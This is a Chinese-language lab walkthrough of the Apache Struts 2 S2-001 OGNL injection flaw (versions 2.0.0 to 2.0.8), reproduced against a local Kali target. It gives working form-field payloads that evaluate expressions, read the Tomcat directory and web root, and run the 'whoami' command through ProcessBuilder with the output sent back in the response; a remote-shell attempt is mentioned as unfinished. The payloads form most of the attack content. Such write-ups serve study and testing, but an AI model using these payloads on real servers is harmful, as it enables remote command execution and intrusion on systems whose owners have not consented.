1.漏洞描述

该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}
进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}
对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行

漏洞版本:Struts 2.0.0 - Struts 2.0.8

# 漏洞复现

1.复现环境  
靶机：kali：192.168.172.134  
攻击机：windows：192.168.31.18

## 验证漏洞是否存在

我们在密码处输入:%{22+20}

![1662822638_631ca8eeecb1ef5288704.png!small?1662822636826](https://image.3001.net/images/20220910/1662822638_631ca8eeecb1ef5288704.png!small?1662822636826)

点击Submit

![1662822697_631ca929b57c4bc8a6e5d.png!small?1662822695666](https://image.3001.net/images/20220910/1662822697_631ca929b57c4bc8a6e5d.png!small?1662822695666)

两个输入框都能成功执行

## 构造poc获取tomcat执行路径

%{“tomcatBinDir{“+@java.lang.System@getProperty(“user.dir”)+”}”} —尝试获取Tomcat
执行路径

![1662822959_631caa2f49a5252358ca0.png!small?1662822957296](https://image.3001.net/images/20220910/1662822959_631caa2f49a5252358ca0.png!small?1662822957296)

成功获取 tomcatBinDir{/usr/local/tomcat}

![1662823030_631caa766c84fe997ee92.png!small?1662823028341](https://image.3001.net/images/20220910/1662823030_631caa766c84fe997ee92.png!small?1662823028341)

5\. 尝试获取Web路径  
%{ #req=@org.apache.struts2.ServletActionContext@getRequest(),
#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
#response.println(#req.getRealPath('/')), #response.flush(), #response.close()
}

![1662823164_631caafc4072cbdfb6bf8.png!small?1662823162292](https://image.3001.net/images/20220910/1662823164_631caafc4072cbdfb6bf8.png!small?1662823162292)

获取成功/usr/local/tomcat/webapps/ROOT/

执行whoami命令

%{ #a=(new java.lang.ProcessBuilder(new
java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new
java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close() }  
  

![1662823356_631cabbc615c34bf8d02f.png!small?1662823354288](https://image.3001.net/images/20220910/1662823356_631cabbc615c34bf8d02f.png!small?1662823354288)

0x00 Getshell没法写攻击机的NC打不开，下个文章一定补上。

